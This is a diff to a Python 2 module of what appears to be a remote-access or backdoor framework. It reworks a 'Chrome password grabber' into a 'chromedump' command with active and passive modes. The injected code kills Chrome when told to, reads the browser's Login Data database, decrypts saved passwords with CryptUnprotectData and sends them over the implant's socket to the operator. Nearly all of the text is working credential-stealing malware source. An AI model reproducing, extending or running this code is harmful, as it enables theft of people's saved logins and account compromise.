@@ -9,10 +9,21 @@ def main(option):
         config.import_statements.append('import os')
         config.import_statements.append('import sqlite3')
         config.import_statements.append('from win32crypt import CryptUnprotectData')
+        config.import_statements.append('from subprocess import check_output')
         config.functions.append('''
-def chrome_active_dump():
-    os.system('taskkill /f /im chrome.exe')
-    msg = '[+]Killed chrome process'
+def chromedump(arg):
+    arg = arg.split(' ', 1)[1]
+    msg = ''
+    if arg == 'active':
+        os.system('taskkill /f /im chrome.exe')
+        msg += '[+]Killed chrome process'
+    elif arg == 'passive':
+        if 'chrome.exe' in check_output(['tasklist']):
+            s.sendall('[-]Chrome is currently running, this module will not do anything until chrome stops')
+            return
+    else:
+        raise IndexError
+        return
     info_list = []
     connection = sqlite3.connect(os.getenv('localappdata') + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\' + 'Login Data')
     with connection:
@@ -39,11 +50,13 @@ def chrome_active_dump():
             msg += '\\n      Password : ' + i['password'].encode('ascii','ignore')
     s.sendall(msg)''')
         config.logics.append('''
-            elif command == "chrome_active":
-                chrome_active_dump()''')
+            elif command == "chromedump":
+                chromedump(data)''')
+        config.help_menu[
+            'chromedump ["active"|"passive"]'] = 'Dumps chrome passwords. If "active" kills chrome.exe first, if "passive" will not run if chrome.exe is running'
     elif option == 'info':
-        print '\nName             : Chrome Password Grabber (Active)' \
+        print '\nName             : Chrome password dump' \
               '\nOS               : Windows' \
               '\nRequired Modules : pypiwin32 (external), os' \
-              '\nCommands         : chrome_active' \
-              '\nDescription      : Grabs saved chrome passwords and sends them back, will kill the chrome process first so it is more aggressive\n'
+              '\nCommands         : chromedump ["active"|"passive"]' \
+              '\nDescription      : Dumps chrome passwords. If "active" kills chrome.exe first, if "passive" will not run if chrome.exe is running \n'
